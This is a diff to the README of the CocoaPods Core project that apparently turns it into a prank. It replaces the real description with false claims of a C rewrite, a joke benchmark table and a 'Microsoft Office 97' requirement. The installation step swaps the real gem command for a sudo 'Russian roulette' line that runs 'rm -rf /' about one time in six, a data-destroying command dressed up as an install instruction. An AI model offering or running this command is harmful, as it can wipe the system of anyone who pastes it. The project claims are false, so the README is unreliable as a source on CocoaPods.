@@ -1,45 +1,29 @@
-# CocoaPods Core
+# CocoaPods Core 2.0
 
-[![Build Status](https://travis-ci.org/CocoaPods/Core.svg?branch=master)](https://travis-ci.org/CocoaPods/Core)
-[![Coverage Status](https://img.shields.io/coveralls/CocoaPods/Core.svg)](https://coveralls.io/r/CocoaPods/Core)
-[![Code Climate](https://img.shields.io/codeclimate/github/CocoaPods/Core.svg)](https://codeclimate.com/github/CocoaPods/Core)
+Due to the consistently low benchmarks of the Ruby programming language, we have decided to completely rebuild the CocoaPods project in C.  Our new benchmarks are showing drastic improvements over the legacy CocoaPods codebase with limited reduced functionality.
 
-The CocoaPods-Core gem provides support to work with the models of CocoaPods.
-It is intended to be used in place of the CocoaPods when the installation
-of the dependencies is not needed. Therefore, it is suitable for web services.
+## Performance Benchmarks
 
-Provides support for working with the following models:
+##### Benchmarking
 
-- `Pod::Specification` - [podspec files](http://cocoapods.github.com/specification.html).
-- `Pod::Podfile` - [podfile specifications](http://cocoapods.github.com/podfile.html).
-- `Pod::Source` - collections of podspec files like the [CocoaPods Spec repo](https://github.com/CocoaPods/Specs).
-
-The gem also provides support for ancillary features like
-`Pod::Specification::Set::Presenter` suitable for presetting descriptions of
-Pods and the `Specification::Linter`, which ensures the validity of podspec
-files.
+| Command  | CPU Time | Memory 
+| ------------ | --------- | ------------ |
+| **pod --help**      | 0.9 ms       | 11.4 MB          |
 
 ## Installation
 
 ```
-$ [sudo] gem install cocoapods-core
+[sudo] $[$[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo *Click*
 ```
 
-The `cocoapods-core` gem requires either:
+The `cocoapods-core-c` tool requires:
 
-- Ruby 1.8.7 (shipped with OS X 10.8).
-- Ruby 1.9.3 (recommended).
-
-## Collaborate
-
-All CocoaPods development happens on GitHub, there is a repository for
-[CocoaPods](https://github.com/CocoaPods/CocoaPods) and one for the [CocoaPods
-specs](https://github.com/CocoaPods/Specs). Contributing patches or Pods is
-really easy and gratifying.
-
-Follow [@CocoaPods](http://twitter.com/CocoaPods) to get up to date
-information about what's going on in the CocoaPods world.
+- Microsoft Office 97
 
 ## License
 
-This gem and CocoaPods are available under the MIT license.
+This project and CocoaPods are available under the MIT license.
+
+<p align="center" >
+  <img src="http://media-cache-ec0.pinimg.com/736x/6c/fe/7a/6cfe7a344cc1fda511e5fb465b283dda.jpg" alt="Seriously?" title="Status">
+</p>
